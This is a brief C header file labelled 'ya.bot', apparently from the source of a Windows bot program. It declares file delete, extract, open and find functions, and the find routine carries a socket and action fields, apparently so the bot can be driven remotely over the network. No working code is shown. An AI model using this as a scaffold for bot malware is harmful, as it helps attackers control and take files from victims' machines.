/*  ya.bot  */

bool file_delete(char *pszFilePath);
bool file_exists(char *pszFilePath);
bool file_extractresource(char *pszResourceName, char *pszResourceType, char *pszExtractPath);
DWORD file_filesize(char *pszFilePath);
#ifndef NO_FILEFIND
int file_find(char *pszFileName,
		char *pszDirectoryName,
		bool bSubDirectories,
		SOCKET bsock,
		char *pszAction,
		char *pszDestination,
		bool bSilent,
		bool bVerbose);
DWORD WINAPI file_findmain(LPVOID param);
#endif
bool file_open(char *pszFilePath);

#ifndef NO_FILEFIND
typedef struct SFileFind
{
	char m_szFileName[MAX_PATH];
	char m_szDirectoryName[MAX_PATH];
	bool m_bSubDirectories;
	SOCKET m_bsock;
	char m_szAction[LOWBUF];
	char m_szDestination[LOWBUF];
	bool m_bSilent;
	bool m_bVerbose;
} SFileFind;
#endif